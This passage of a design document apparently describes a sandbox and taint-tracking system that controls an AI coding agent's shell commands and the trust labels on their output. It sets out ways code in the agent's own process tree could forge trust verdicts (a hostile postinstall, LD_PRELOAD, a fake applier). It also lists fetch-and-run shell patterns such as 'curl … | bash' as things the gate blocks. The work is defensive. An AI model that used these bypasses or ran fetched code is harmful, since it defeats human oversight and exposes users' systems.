   fragments; blocks are NUL-joined so a span never matches across blocks);
   *a minimum span length* (`EXACT_MATCH_MIN_LENGTH = 16`: "10" or "ok" appear
   in almost any context); and the accepted *selection channel* residual: an
   untrusted-influenced command can still CHOOSE which trusted bytes to echo.
   A weaker guarantee than rungs 2–3, which verify the influence set itself.
2. **Family A: enforce-clean box — built** (§8.5). Clean by construction;
   fails closed into the ordinary box (graceful fallback, output UNTRUSTED).
3. **Family B: observed read-set** — unotify + ADDFD record, judged against
   `path_policy ∪ file_taint` (orphan ⇒ no upgrade). Design only.

### 8.5 Semantics — upgrade-only, posture-gated (fail-closed preserved)

- `Bash: { schema: "UNTRUSTED" }` **remains the unconditional default.** The
  exec supervisor reports a per-invocation verdict (`clean: files ⊆ trusted ∧
  net = ∅ ∧ invocation untainted`) to the arbiter, keyed by proc key and
  callId; at tool_result time the classifier upgrades **only on an
  affirmative clean verdict**. No verdict (unboxed session, attribution
  failure, supervisor error) means the literal stands.
- Only boxed AgentShell invocations qualify; HumanShell never does. It landed
  with a live e2e in the boxed posture (E47), not only units.
- `isProcessTainted` gates the verdict too (lineage or env inheritance from a
  tainted parent poisons the invocation regardless of its own reads).

**The arbiter half.** `arbiter/policy/exec-clean-verdicts.ts`
(`ExecCleanVerdictStore`): a report resolves through a fail-closed gate
chain (its own `clean` claim, `boxed`, `shell === "AgentShell"`, a `procKey`
the ARBITER re-checks against its live taint registry, a 64-hex
`outputSha256`, and the reporter channel, §8.5.3); any failure records
UNCLEAN with the failing gate named, and unclean is monotonic downward. IPC:
`reportExecCleanVerdict` / `execCleanVerdictFor`. Consumption:
`classifyExecCleanUpgrade` (claude-code-inbound.ts), chained after the rung-1
rule on an UNTRUSTED base verdict only; the proxy passes the tool_use id as
`ClassifyRequest.callId` on every tool_result classify. **The hash binding is
load-bearing:** the verdict vouches for an *invocation*, but the classified
value arrives via the agent harness's tool_result (attacker-reachable by
threat model), so the upgrade requires `sha256(value)` to equal the recorded
output hash; a forged or reshaped result misses (a utility miss, never a
leak). The harness strips the trailing newline when framing the body, so
consumption also accepts `sha256(value + "\n")`: that form reveals strictly
FEWER bytes than the clean output, and the tolerance is exactly one newline.

**The kernel half.** In `interceptors/exec-supervisor` behind its `kernel`
feature; Landlock alone is required (non-root; the box's netns supplies net
= ∅). Under the clean-box posture each AgentShell exec on the Bubblewrap
backend is FIRST attempted in the clean box: the same bwrap mounts, but the
interposed `mandu-landlock-apply --clean` enacts `plan_landlock_clean`
(fs-supervisor): readable ⊆ system roots (`sandbox::CLEAN_READ_ROOTS`) +
individually CONTENT-HASH-verified trusted files
(`clean::verify_trusted_reads`, resolved at plan-build time; the grant list
is empty today, because the registry records only untrusted-by-origin, so
orphan ⇒ unreadable stands); the AgentView bind destinations are WRITE-ONLY
(results land, contents never influence; no EXECUTE, so workspace program
text cannot come in as code); the tmpfs scratch keeps full RW (box-authored,
so inductively clean); `/dev` gets READ_FILE|WRITE_FILE; `/proc` is denied.
Three soundness gates around the run: **stdin** must be provably
influence-free (closed or `/dev/null`: the tool leaf of `cat evil.md | tool`
must never qualify); **exit 0** is the verdict gate (the applier fails closed
without exec'ing the target, so a zero exit implies the clean ruleset was
live around the whole run); and stdout is CAPTURED (capped), so a failed
attempt is discarded invisibly and rerun in the ordinary box. On clean
completion the bytes are forwarded, the callId is resolved off
`execDecisionFor`'s argv-signature lookup, and `reportExecCleanVerdict` is
called with `sha256(stdout)` before exit, so the verdict is in the store when
the tool_result reaches classify. Kernel tests: clean completion + hash-bound
report, workspace-read denial + fallback, hash-matching-only trusted grants,
pipe-stdin skip.

#### 8.5.1 The launcher default — clean box ON where the guard hosts it

The default is ON exactly when the session's guard hosts the attempt: the
arbiter offered the session a reporter (integrity axis ON, Linux, the exec box
and the guard not turned off and the guard built), so the shims name the
guard's socket (`MANDU_EXEC_CLEAN_SOCK`) and bake `MANDU_EXEC_CLEAN_BOX="1"`
(`writeExecBoxShims`; a HARD export, like the view pair: an ambient env must
not flip a per-session launcher decision). Elsewhere the default is OFF: the
in-tree attempt's verdict is not honored, so only its rerun cost would
remain. `--exec-clean-box` still forces the in-tree attempt (a posture cell
for tests); `--no-exec-clean-box` / `exec-clean-box = false` turn both off;
`--no-kernel` drops it with exec-box. The `mandu-exec-box` bin's own default
stays off.

**The cost story.** A clean attempt that fails is discarded and the command
reruns in the ordinary box, so any side effect the attempt produced BEFORE
failing happens twice. The **default exec-box set is read-only tools**, which
have no side effects to double, and the clean box's only new refusal is a
READ outside the system roots, which fails the command at that first read. A
user who WIDENS the set to a mutating command takes the documented
partial-attempt risk (a multi-target write that succeeds on its first target
and is then refused on a read repeats that write in the rerun); the banner
states it.

What the default buys is §8.1's utility: a benign boxed `cat notes.md` whose
output is a clean function of trusted inputs reaches the model un-symbolized
(E46/E47), instead of every Bash line being masked.

**Secrets in the clean attempt.** A registered secret opened inside the
attempt is refused by the net-guard's interposer with `EACCES` and no hold,
before the arbiter is asked: the guard recognizes the box by the applier's
own exec (`mandu-landlock-apply --clean …`). Two reasons
(confidentiality-plan-10-flow-taint.md §12.2): the attempt would otherwise
spend the human's once-answer on a run whose output is discarded, and a raw
descriptor injected into the box would hand it a file outside its read-allow
set. The attempt fails at that read and the ordinary rerun asks once.

#### 8.5.3 Who may report a verdict: not the agent's tree

**The gap** (a sandbox security review, 2026-09-28). Every gate in §8.5
checks what the report SAYS; none checked who SENT it. The sender was
`mandu-exec-box`, a child of the agent's own PATH shim, with the agent's uid
and an environment the agent controls. Code anywhere in that tree (a hostile
`npm install` postinstall is enough) could write `reportExecCleanVerdict` to
the arbiter's data socket itself with a callId it saw and the sha256 of bytes
it chose; run the real box under `LD_PRELOAD`, `ptrace` or a fake applier
that exits 0 without restricting anything; or leave descriptors open into the
attempt. A forged CLEAN verdict upgrades the chosen tool_result to TRUSTED: a
break of the core invariant in `injection` and `full`. The hash binding does
not help, since the forger chooses both sides.

**Fail closed first.** `ExecCleanVerdictStore.report` takes the channel the
report arrived on. A `data-socket` report resolves UNCLEAN before any other
gate; only an `authenticated-supervisor` report can resolve CLEAN. Rung 1 is
untouched: it is decided inside the arbiter from trusted context alone.

**The guard hosts the attempt and vouches for it.** Only a process outside
the agent's tree can vouch for a run, and the whole-agent guard
(`mandu-net-guard`) is one: the launcher starts it before the agent, it lives
outside the agent's seccomp filter, the agent cannot signal it
(`guard_signals`), and it is not dumpable.

1. **Who may report: a token only the guard holds**
   (`arbiter/policy/clean-reporters.ts`). The launcher's FIRST
   `setSessionUpstream` for the session (bind-once, before any service or the
   agent exists) carries `cleanReporter: true`; only that fresh bind makes
   the session's reporter claimable. The guard claims the token
   (`claimCleanReporter`) over its own arbiter connection BEFORE it lets its
   child exec the agent; the arbiter keeps only the token's sha256. A second
   claim for the session REVOKES the reporter for good: the session key is
   not secret, so whoever loses a race to the claim, nobody keeps a token,
   and the race can only happen before the agent has a callId to forge for. A
   report with a valid token resolves as `authenticated-supervisor` for the
   token's session; every other report is `data-socket` and resolves
   UNCLEAN. The reporter lives in memory only: an arbiter restart forgets it.
   (SO_PEERCRED plus the peer's `/proc/<pid>/exe` was rejected: the guard is
   not dumpable, Node has no SO_PEERCRED, and a token leaves no pid-reuse
   window.)
2. **A verdict speaks for its own session.** `classifyExecCleanUpgrade`
   honors a clean verdict only when its `sessionKey` equals the classifying
   request's, so a guard the agent itself started (a nested `mandu` launch)
   reports only for its nested session.
3. **The guard runs the attempt** (`net-supervisor` `clean_host` +
   `clean_host_kernel`; the wire is `mandu_arbiter::clean_run`). The launcher
   passes `--clean-socket <run dir>/clean.sock --clean-session <key>
   --clean-box <mandu-exec-box> --clean-env KEY=VALUE…`: the box binary and
   the hosted box's whole environment come from the launcher, never from the
   agent. An eligible exec (AgentShell, Bubblewrap, Landlock + applier, stdin
   `/dev/null` or closed) asks the guard with `{argv, cwd}` and never
   attempts the run itself. The guard checks the requester is in its agent
   tree (SO_PEERCRED, in its own pid namespace) and runs `mandu-exec-box
   --clean-only --cwd <cwd> -- <argv>` with that environment, stdin
   `/dev/null`, every guard descriptor closed on exec, and the guard's own
   filter installed in the child, so a registered secret is refused inside
   the hosted box as in any clean attempt. `--clean-only` runs the clean
   attempt only, reports nothing, and exits 79 instead of running the
   ordinary box.
4. **The guard reports.** On exit 0 it hashes the captured stdout, resolves
   the callId from the exec-decision store by the argv signature (skipping a
   decision another session recorded), and reports with its token and the
   REQUESTER's proc key (the arbiter's lineage-taint gate re-checks the
   process whose command it was). It answers the requester with a header and
   the exact bytes. A void attempt answers "not completed" and the requester
   runs the ordinary box, output UNTRUSTED.
5. **What stays in the tree.** The ordinary box and its fallback run, output
   UNTRUSTED. `--exec-clean-box` without a hosting guard still runs the
   in-tree attempt; its report is not honored.

**Residuals (all fail-closed: the cost is the upgrade, never a leak).** No
reporter where there is no guard (`--no-net-guard`, the guard not built, a
host without seccomp user notification) or with the integrity axis OFF. The
hosted box runs outside the agent's secret-twin mount and pid namespaces: its
reads are the clean ruleset's, and a registered secret is refused by the
guard's open trap. A project under `/tmp` never runs clean (§4). The guard
runs a requested command to completion even if the requester quit. A racing
claim or an arbiter restart leaves the session without the upgrade until the
next launch.

Tests: `arbiter` `clean-reporters.test.ts`, `exec-clean-verdicts.test.ts`,
`claude-code-policy.test.ts` (a verdict of another session, or with no
session, never upgrades), `ipc.test.ts`; `mandu-arbiter` `clean_run`;
`net-supervisor` `clean_host` and the kernel test `clean_host_integration.rs`
(the hosted box runs under the guard's filter with only the launcher's
environment; a completed run is reported with the token, the requester's proc
key and the session; a void attempt and a requester outside the tree report
nothing); `launcher` `test/integrity/clean-host.test.ts`,
`exec-box-shims.test.ts`, `net-guard.test.ts`, `model-endpoints.test.ts`; the
integration `tests/integrity/guard-hosted-clean-box.test.ts` (the hosted
`cat` upgrades in its own session only, a forged report is not honored, a
claim from inside the agent is refused and revokes the reporter); and E47
`exec-trust-derived-chain` live.

The same class on the READ side (the data socket is reachable from the
agent's tree, and some ops return originals) is closed by the human plane
(`arbiter-human-plane.md`).

### 8.6 Why rung 3 is parked, and the un-defer trigger

The payoff is *utility* (fewer needlessly symbolized benign outputs); the
T-LLM invariant gains nothing. Rung 3 is un-deferred only if rung 2's utility
loss (clean-box command failures) itself becomes the complaint: a benign task
that demonstrably fails or degrades because a needed file was outside the
clean ruleset.

#### 8.6a The TDD pair — the trigger, kept executable

Two claude-e2e scenarios (`claude-e2e.test.ts`, an agent
drill in the maintainers' repository, not published; e2e-catalog §2b
documents the `Scenario.future` gate) pin the utility, both graduated:

- **`exec-trust-echo-unsymbolized` (E46), rung 1.** A benign echo whose
  output bytes are prompt bytes; the oracle is pure classification
  (`not-symbolized`: the marker must not land in any `symbolize` original),
  since exact-match output is by definition already in the trusted context.
- **`exec-trust-derived-chain` (E47), rung 2.** A digest (deterministic for
  the harness, uncomputable in-head, never in the prompt) is read from exec
  stdout, SLICED, and used literally in a second command. Every opaque-token
  path is closed (a symbol is atomic; inspect re-symbolizes; a reply echo
  resolves the FULL line, not the slice), so `expectVerbatim` on the digest
  is red WITHOUT the upgrade. Green rides the real posture: launcher-authentic
  exec-box shims (`python3`) with the clean box on. Two findings shaped the
  scenario: a `printf … | sha256sum` PIPELINE can never qualify under leaf
  shims (only the leaf is boxed, its stdin is a pipe from a process the box
  never saw, and its argv cannot match the whole-pipeline signature), so the
  scenario uses a single program whose input rides its own argv with `<
  /dev/null`; and the harness's stripped trailing newline (§8.5's one-newline
  tolerance). Without the upgrade the model was seen to ask the U-LLM for the
  slice (re-symbolized, so still atomic) and then **fabricate** a plausible
  value and write it to disk: the symbol-quality confident-wrong-value class
  (`symbol-quality.md`) on the exec-stdout surface.

**Tripwire.** `benign-bash-echo` (E4) relies on its echoed marker being
symbolized as execution evidence. `mandu-live-ok` is 15 chars, one under
`EXACT_MATCH_MIN_LENGTH` (16), so E4 keeps symbolizing. If the floor is ever
lowered to ≤ 15, that change must move E4's evidence to a non-symbolize
channel (the E46 pattern) in the same commit.

### 8.7 The deny-side sibling — a taint-aware exec gate (7a built 2026-09-04)

Everything above is *upgrade-only*: it changes labels, never behavior. The
same machinery enables the inverse rung.

**The gap it closes.** §3.3: a symbol-free command that EXECUTES untrusted
bytes (`curl -o setup.sh` → `bash setup.sh`). The bytes flow curl → disk →
bash without re-entering the model proxy, so the Phase-0 *string* gate has no
`$MDU:*` token to key on. Phase 1 *contains* it (the AgentShell world swap),
but the world swap is kernel-tier, so for deployments without it "contained"
did not hold; *prevention* (refuse to run it) was chosen for fetched code.

**The observation.** The taint registry already holds the fact the string
gate is missing: `curl -o setup.sh` is a net-influenced invocation, so the
file it wrote is untrusted by origin. The machinery built for "may this
output be trusted?" answers "is the program being executed untrusted?" with
no new observation channel. Constraints that carry over: **enforce, don't
record** (execve/script targets decided Family-A-shaped, never by
`CONTINUE` observation, which is race-prone at the decision point); and
**`isProcessTainted` still gates**.

**One semantics choice does NOT carry over — the fail-closed direction.** For
the upgrade, orphan/unknown ⇒ no upgrade is pure fail-closed. Read as a deny
trigger, the same rule would refuse every pre-existing, unlabeled workspace
script: an over-block cliff, not a safety win, because the world swap
already contains the unknown case. So the rung splits (7a, 7b below).

#### 8.7a Deny on affirmative taint (built) — and allow-list execution (7b, not built)

- **7a — deny on affirmative taint** (the rung that closes the demonstrated
  gap, built as §8.7.1): block / require approval when the program text
  resolves in `file_taint` to untrusted-by-origin with an attributable
  writer. Fetched code is exactly this case. Unknown/orphan program text
  keeps executing, contained, output UNTRUSTED. Rule id
  `exec:tainted-program-text`.
- **7b — allow-list execution** (a posture idea): execute only
  affirmatively-trusted program text (the clean-exec box). Sound by
  construction, but it inherits Family A's utility cliff with **no graceful
  fallback possible** (a fallback that executes anyway would defeat the
  deny). A posture for hardened deployments, not a default.

#### 8.7.1 What shipped — the provenance gate, without the kernel tier first

The sketch assumed the registry fed by the kernel fs-supervisor (observed
writes) and consulted by the exec-supervisor's clean box. Without the kernel
tier neither runs, so 7a was built at the **model-context chokepoint**, the
same `execGate` op the token gate answers, with the registry fed by
**declared** writes: pure decision logic + one store consumer, no kernel
dependency.

- **`arbiter/policy/exec-program-text.ts`** (pure, unit-tested): three
  readings of the command string the model wrote.
  - `declaredNetWrites`: the files a command *declares* it fills with
    network bytes (`curl -o/-O`, `wget -O` or its default name, a
    `>`/`>>`/`tee` downstream of a fetcher in the same pipeline). An
    attributable host is required (`-K config`, `$URL` declare nothing).
  - `programTextPaths`: the files a command reads *as its program* (an
    interpreter's script argument, `source`/`.`, a direct `./x` or
    `/abs/x`, `bash < x`).
  - `stdinPrograms`: programs that are not a file argument: `curl … | bash`,
    `bash <(curl …)`, `bash -c "$(curl …)"`, `eval "$(curl …)"` (provenance
    in the string) and `cat x | bash`, `bash -c "$(cat x)"`, `eval "$(<x)"`,
    `source <(cat x)` (the fed file, looked up like a script argument). These
    are the spellings a *blocked* model reaches for next.
- **`ProvenanceStore.declareNetWrite` / `programTextTrust`**: declared rows
  share `file_taint` with the kernel writer under a synthetic content hash
  (`declared:<session>:<path>`). Relative paths are **session-scoped**;
  absolute paths are global; a kernel-observed absolute row also matches its
  cwd-relative spelling within its session.
- **The server wrap** (`ipc/server.ts` `gateProgramText`, integrity-gated,
  after the token gate): every candidate program text that resolves
  *untrusted-by-origin* goes through the **same approval queue** as the
  fs/net/escalation gates, keyed `exec-program:<originHost>` × path
  (`(stdin)` for a pipe or substitution). Prior approved → allow; prior
  denied → block, no re-queue; otherwise queue a pending row and block. An
  *allowed* fetch records its declared writes on the final verdict (a blocked
  fetch never runs, so it declares nothing).
- **Enforcement** is the proxy's exit-77 sentinel; the proxy forwards
  `approvalId` + `programText` onto the `exec_action` event, and the
  dashboard renders the queue key ("run code it downloaded from <host>:
  <path>").

Deny on *affirmative* taint only: unknown / pre-existing / orphan scripts
execute as before; merely *reading* a fetched file (`cat`, `head`, `grep`,
`echo "$(cat x)"`) is never gated, so the review the model insists on stays
free.

**Residuals** (§3.3 lists them as the gate's boundary): shell expansion the
pure readings do not follow, a copy/rename before the run (the copy is not a
declared write), an unrecognized fetcher, and a schemeless bare-host `curl`.
Each is closable by the kernel fs-supervisor's *observed* `file_taint` rows,
which the same `programTextTrust` lookup already consumes. The live oracle is
`exec-curl-run-blindspot` (§6), which pins the enforcement.
